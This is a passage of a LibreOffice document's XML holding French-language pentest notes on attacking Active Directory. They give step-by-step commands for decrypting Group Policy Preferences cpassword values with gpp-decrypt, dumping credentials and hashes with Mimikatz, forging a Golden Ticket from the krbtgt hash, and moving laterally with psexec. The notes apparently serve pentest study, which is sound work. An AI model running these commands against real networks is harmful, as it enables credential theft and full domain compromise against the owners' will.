          <text:p text:style-name="P187"><text:span text:style-name="Strong_20_Emphasis">Impact et conséquences</text:span> : L'attaque GPP peut avoir des conséquences graves, car elle peut permettre aux attaquants d'obtenir des accès non autorisés à des ressources et des informations sensibles, compromettre la sécurité du réseau, et entraîner des violations de données et d'autres incidents de sécurité.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P101"/>
      <text:p text:style-name="P144">4.2 Etapes</text:p>
      <text:p text:style-name="P102"/>
      <text:p text:style-name="P103">On a besoin d'un user account pour accéder au dossier Sysvol</text:p>
      <text:p text:style-name="P104">On cherche le cpassword dans un fichier xml<text:span text:style-name="T96">. On a aussi le nom du user</text:span></text:p>
      <text:p text:style-name="P104"/>
      <text:p text:style-name="P105">On copie le hash de cpassword</text:p>
      <text:p text:style-name="P105"/>
      <text:p text:style-name="P162">gpp-decrypt &lt;copie hash ici&gt;</text:p>
      <text:p text:style-name="P105"/>
      <text:p text:style-name="P105"/>
      <text:p text:style-name="P74">5. <text:span text:style-name="T97">Credentials Dumping avec Mimikatz</text:span></text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P153">5.1 Présentation de Mimikatz</text:p>
      <text:p text:style-name="P153"/>
      <text:p text:style-name="P127">Outils pour voir et voler des creds ou encore générer des tickets Kerberos.</text:p>
      <text:p text:style-name="P127">Il peut aussi dumper des creds stockées dans la mémoire de la machine.</text:p>
      <text:p text:style-name="P127"/>
      <text:p text:style-name="P127">Parmi les attaques possibles : Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket</text:p>
      <text:p text:style-name="P128"/>
      <text:p text:style-name="P130">On doit être admin local</text:p>
      <text:p text:style-name="P130"/>
      <text:p text:style-name="P154">5.2 Dumping des creds</text:p>
      <text:p text:style-name="P129"><text:soft-page-break/>cmd</text:p>
      <text:p text:style-name="P173">mimikatz.exe</text:p>
      <text:p text:style-name="P173">privilege::debug<text:span text:style-name="T98"> </text:span><text:span text:style-name="T29">(si </text:span><text:span text:style-name="T31">"</text:span><text:span text:style-name="T29">20 </text:span><text:span text:style-name="T32">OK</text:span><text:span text:style-name="T31">"</text:span><text:span text:style-name="T29"> on est bon)</text:span></text:p>
      <text:p text:style-name="P174">sekurlsa::logonpasswords</text:p>
      <text:p text:style-name="P131">On peut récup les hashes qui sont affichés</text:p>
      <text:p text:style-name="P176">lsadump::sam (dumper la SAM)</text:p>
      <text:p text:style-name="P177">lsadump::lsa /patch <text:span text:style-name="T29">(on obtient les hashes des users via le dump du lsa, local security authority)</text:span></text:p>
      <text:p text:style-name="P176"/>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P75">6. Golden Ticket<text:span text:style-name="T98"> (et Pass-the-Ticket)</text:span></text:p>
      <text:p text:style-name="P175"/>
      <text:p text:style-name="P132">Si on récupère le hash du krbtgt (par exemple avec mimikatz), on peut forger un golden ticket</text:p>
      <text:p text:style-name="P132"/>
      <text:p text:style-name="P133">On utilise Mimikatz</text:p>
      <text:p text:style-name="P133"/>
      <text:p text:style-name="P134">cmd</text:p>
      <text:p text:style-name="P178">mimikatz.exe</text:p>
      <text:p text:style-name="P178">privilege::debug (si "20 OK" on est bon)</text:p>
      <text:p text:style-name="P178">lsadump::lsa /inject /name:krbtgt</text:p>
      <text:p text:style-name="P135">On prend note de : SID du domaine (S-1-5....) et le NTLM du krbtgt</text:p>
      <text:p text:style-name="P179">kerberos::golden /User:Pentester /domain;&lt;domain_name.local&gt;<text:span text:style-name="T101"> </text:span>/sid:&lt;copie_sid&gt;<text:span text:style-name="T99">/krbtgt:&lt;hash_NTLM_krbtgt&gt;</text:span><text:span text:style-name="T100"> /id:500</text:span><text:span text:style-name="T101"> /ptt</text:span></text:p>
      <text:p text:style-name="P180">misc::cmd (on a un prompt avec le golden ticket)</text:p>
      <text:p text:style-name="P180"/>
      <text:p text:style-name="P136">On a présent un accès quasi illimité à l'ensemble du domaine. <text:s text:c="2"/></text:p>
      <text:p text:style-name="P137">Par exemple on peut avec un shell sur une machine :</text:p>
      <text:p text:style-name="P181">psexec.exe \\&lt;Nom de la machine&gt; cmd.exe</text:p>
      <text:p text:style-name="P181"/>
      <text:p text:style-name="P1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11:41:16.418151665</meta:creation-date>
    <dc:date>2024-01-06T17:57:16.999182386</dc:date>
    <meta:editing-duration>PT6H13M50S</meta:editing-duration>
    <meta:editing-cycles>271</meta:editing-cycles>
    <meta:generator>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="9" meta:paragraph-count="255" meta:word-count="2159" meta:character-count="13932" meta:non-whitespace-character-count="11973"/>
  </office:meta>
</office:document-meta>
</file>